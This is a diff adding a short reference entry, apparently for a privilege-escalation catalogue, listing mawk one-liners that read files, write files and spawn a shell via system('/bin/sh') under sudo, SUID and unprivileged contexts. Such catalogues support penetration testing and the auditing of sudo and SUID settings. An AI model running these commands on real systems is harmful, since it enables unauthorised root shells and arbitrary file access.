@@ -1,0 +1,38 @@
+mawk
+====
+
+File read
+---------
+
+[Sudo]
+    mawk '//' /path/to/input-file
+
+[SUID]
+    mawk '//' /path/to/input-file
+
+[Unprivileged]
+    mawk '//' /path/to/input-file
+
+File write
+----------
+
+[Sudo]
+    mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+
+[SUID]
+    mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+
+[Unprivileged]
+    mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+
+Shell
+-----
+
+[Sudo]
+    mawk 'BEGIN {system("/bin/sh")}'
+
+[SUID]
+    mawk 'BEGIN {system("/bin/sh")}'
+
+[Unprivileged]
+    mawk 'BEGIN {system("/bin/sh")}'
